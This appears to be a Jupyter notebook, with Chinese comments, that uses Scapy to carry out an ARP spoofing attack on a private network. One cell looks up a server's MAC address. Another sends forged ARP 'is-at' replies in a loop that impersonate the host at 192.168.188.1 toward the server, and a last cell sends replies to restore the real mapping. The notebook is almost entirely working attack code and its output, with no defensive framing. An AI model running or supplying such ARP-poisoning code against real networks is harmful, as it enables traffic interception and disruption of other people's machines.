{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "server的MAC地址为: 00:0c:29:09:2a:2a\n",
      "host的MAC地址为: 00:50:56:C0:00:08\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "\n",
    "# 获取设备的MAC地址\n",
    "def get_mac(ip):\n",
    "    response = sr1(ARP(pdst=ip), timeout=2, verbose=False)\n",
    "    if response:\n",
    "        return response.hwsrc\n",
    "    else:\n",
    "        return None\n",
    "\n",
    "# 获取server和host的MAC地址\n",
    "server_ip = \"192.168.188.130\"\n",
    "host_ip = \"192.168.188.1\"\n",
    "\n",
    "server_mac = get_mac(server_ip)\n",
    "print(f\"server的MAC地址为: {server_mac}\")\n",
    "\n",
    "host_mac = \"00:50:56:C0:00:08\";\n",
    "print(f\"host的MAC地址为: {host_mac}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 6 packets.\n"
     ]
    }
   ],
   "source": [
    "\n",
    "atk = ARP(psrc=\"192.168.188.1\", hwsrc=host_mac, hwdst=\"ff:ff:ff:ff:ff:ff\", pdst=\"192.168.188.130\", op='is-at')\n",
    "send(atk, inter=RandNum(10,20), loop=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "resume = ARP(psrc=\"192.168.188.130\", hwsrc=server_mac, hwdst=host_mac, pdst=\"192.168.188.1\", op='is-at')\n",
    "send(resume, inter=RandNum(1,10), loop=1)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
